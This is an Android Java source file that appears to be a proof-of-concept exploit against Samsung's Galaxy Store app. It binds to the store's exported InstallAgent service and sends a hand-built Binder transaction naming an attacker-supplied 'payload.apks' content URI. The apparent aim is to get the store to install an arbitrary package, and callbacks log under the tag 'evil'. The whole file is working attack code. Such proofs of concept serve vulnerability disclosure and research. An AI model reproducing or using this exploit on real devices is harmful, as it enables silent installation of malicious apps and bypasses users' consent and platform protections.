package poc.app;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.ServiceConnection;
import android.net.Uri;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.util.Log;

import com.sec.android.app.samsungapps.api.aidl.IInstallAgentResultCallback;

public class MainActivity extends Activity {
    private ServiceConnection mServiceConnection = new ServiceConnection() {
        public void onServiceConnected(ComponentName cName, IBinder service) {
            processBinder(service);
        }

        public void onServiceDisconnected(ComponentName cName) {
        }
    };

    private IInstallAgentResultCallback.Stub callback = new IInstallAgentResultCallback.Stub() {
        @Override
        public void onInstallStart(String str) {
            Log.d("evil", "onInstallStart");
        }

        @Override
        public void onInstallSuccess(String str) {
            Log.d("evil", "onInstallSuccess");
        }

        @Override
        public void onInstallFailed(String str, String str2) {
            Log.d("evil", "onInstallFailed");
        }
    };

    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent i = new Intent();
        i.setClassName("com.sec.android.app.samsungapps", "com.sec.android.app.samsungapps.api.InstallAgent");
        bindService(i, mServiceConnection, BIND_AUTO_CREATE);
    }

    private void processBinder(IBinder binder) {
        try {
            Parcel parcel = Parcel.obtain();
            parcel.writeInterfaceToken("com.sec.android.app.samsungapps.api.aidl.IInstallAgentAPI");
            parcel.writeString(getPackageName());
            parcel.writeString(getPackageName());

            parcel.writeInt(1);
            Uri.parse("content://provider.test/payload.apks").writeToParcel(parcel, 0);

            parcel.writeStrongBinder(callback);

            Parcel reply = Parcel.obtain();

            binder.transact(1, parcel, reply, 0);
            reply.readException();
        } catch (Throwable th) {
            throw new RuntimeException(th);
        }
    }
}